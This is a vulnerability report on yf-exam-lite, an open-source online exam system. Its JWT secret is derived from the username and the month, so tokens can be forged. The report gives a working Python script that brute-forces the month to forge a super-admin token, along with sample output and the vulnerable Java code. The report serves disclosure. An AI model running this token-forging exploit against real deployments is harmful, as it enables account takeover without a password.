# yf-exam-lite Weak JWT Secret Derivation Authentication Bypass (Account Takeover) Vulnerability Report

## Vulnerability Description

yf-exam-lite (yf-coder/yf-exam-lite, an open-source online examination system) : the JWT signing secret is **derived** from the username and the current month instead of a random server-side key. `JwtUtils.encryptSecret(username)` computes `MD5(username + "&" + MD5(username + "&" + MONTH))`, where `MONTH` is `Calendar.MONTH` (`0..11`). The username is read back unverified from the token (`JWT.decode`), so the only unknown for an attacker is a 12-value integer. By brute-forcing the month, an attacker forges a valid HS256 JWT for any known username (the default super admin is `admin`) and authenticates **without a password**, taking over the account.

## Affected Versions

yf-exam v1.0.0

## Exploitation Conditions

- A known/guessable username (default super admin `admin` exists)
- Ability to reach the API (`/exam/api/**`, port `8101`)

## Reproduction

Environment: yf-exam-lite API on `127.0.0.1:8101`, DB `yf_exam_lite` with default `admin` (role `sa`).

**1. Forge a JWT by brute-forcing the month**

```python
import hashlib, hmac, base64, json, time, urllib.request

def md5(s): return hashlib.md5(s.encode()).hexdigest()
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

user = "admin"
for month in range(12):                                   # Calendar.MONTH = 0..11
    secret = md5(user + "&" + md5(user + "&" + str(month)))
    header = b64(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64(json.dumps({"username": user, "exp": int(time.time()) + 86400},
                             separators=(",", ":")).encode())
    sig = b64(hmac.new(secret.encode(), header + b"." + payload, hashlib.sha256).digest())
    jwt = (header + b"." + payload + b"." + sig).decode()
    req = urllib.request.Request("http://127.0.0.1:8101/exam/api/sys/user/info?token=" + jwt,
                                 data=b"", method="POST")
    req.add_header("token", jwt)                          # JwtFilter reads header "token"
    body = urllib.request.urlopen(req).read().decode()
    print("month=%d -> %s" % (month, body[:120]))
```

![image-20260824210254731](https://github.com/fangtang7/picx-images-hosting/raw/master/ym/image-20260824210254731.2ksnjw9j0b.webp)

**2. Brute-force output — month `7` (August) authenticates**

```
[ 0] secret=3f318bea... -> {"code":10010002,"msg":"您还未登录，请先登录！","success":false}
[ 1] secret=aeb26c38... -> {"code":10010002,...}
...
[ 6] secret=06efebe7... -> {"code":10010002,...}
[ 7] secret=c8cadf68... -> {"code":0,"data":{"userName":"admin","realName":"超管A","roleIds":"sa","roles":["sa"],...},"success":true}
```

**3. The forged token authenticates as the super admin**

```json
{
  "code": 0,
  "data": {
    "id": "10001",
    "userName": "admin",
    "realName": "超管A",
    "roleIds": "sa",
    "roles": ["sa"],
    "state": 0
  },
  "success": true
}
```

No password was used — the attacker fully impersonates the super admin (`roleIds=sa`).

Code:

```java
// JwtUtils.java:84-98 — the secret is predictable, keyed only by username + month
private static String encryptSecret(String userName){
    Calendar cl = Calendar.getInstance();
    cl.setTimeInMillis(System.currentTimeMillis());
    StringBuffer sb = new StringBuffer(userName)
            .append("&")
            .append(cl.get(Calendar.MONTH));        // 0..11
    String secret = Md5Util.md5(sb.toString());
    return Md5Util.md5(userName + "&" + secret);
}

// JwtUtils.java:31-44 — verify() uses the derived secret as the HMAC key
public static boolean verify(String token, String username) {
    Algorithm algorithm = Algorithm.HMAC256(encryptSecret(username));
    JWTVerifier verifier = JWT.require(algorithm).withClaim("username", username).build();
    verifier.verify(token);
    return true;
}

// JwtUtils.java:55-62 — username is read from the token WITHOUT signature check
public static String getUsername(String token) {
    DecodedJWT jwt = JWT.decode(token);          // base64 decode only, no verification
    return jwt.getClaim("username").asString();
}

// SysUserServiceImpl.token():104-129 — login identity comes straight from the token username
String username = JwtUtils.getUsername(token);
boolean check = JwtUtils.verify(token, username);
...
wrapper.lambda().eq(SysUser::getUserName, username);   // resolve user by forged username
return this.setToken(user);

// ShiroConfig.java:83 — all routes except the anon whitelist go through JwtFilter
map.put("/**", "jwt");
```

![image-20260824210814375](https://github.com/fangtang7/picx-images-hosting/raw/master/ym/image-20260824210814375.1ow64g0ckq.webp)

![image-20260824210842918](https://github.com/fangtang7/picx-images-hosting/raw/master/ym/image-20260824210842918.86udxrbo6g.webp)

![image-20260824210903526](https://github.com/fangtang7/picx-images-hosting/raw/master/ym/image-20260824210903526.8vnnhrzj7w.webp)

![image-20260824211005057](https://github.com/fangtang7/picx-images-hosting/raw/master/ym/image-20260824211005057.2a5tqqw226.webp)
![image-20260824211027522](https://github.com/fangtang7/picx-images-hosting/raw/master/ym/image-20260824211027522.7ehig0wc0b.webp)
